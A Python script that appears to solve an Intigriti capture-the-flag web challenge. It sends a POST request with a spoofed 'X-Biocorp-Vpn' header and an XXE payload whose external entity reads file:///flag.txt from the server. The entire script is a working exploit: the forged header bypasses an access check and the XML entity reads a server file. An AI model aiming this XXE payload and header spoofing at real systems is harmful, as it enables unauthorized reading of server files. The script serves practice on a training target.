import requests

# Define the target URL
url = 'https://biocorp.ctf.intigriti.io/panel.php'

# Define the headers
headers = {
    'Host': 'biocorp.ctf.intigriti.io',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'X-Biocorp-Vpn': '80.187.61.102',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
    'Content-Type': 'application/xml'
}

# Define the XML payload
xml_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE reactor [
<!ELEMENT reactor ANY >
<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
<reactor>
    <status>
        <temperature>&xxe;</temperature>
        <pressure>1337</pressure>
        <control_rods>Lowered</control_rods>
    </status>
</reactor>
'''

# Send the POST request
response = requests.post(url, headers=headers, data=xml_payload)

# Print the response
print(response.text)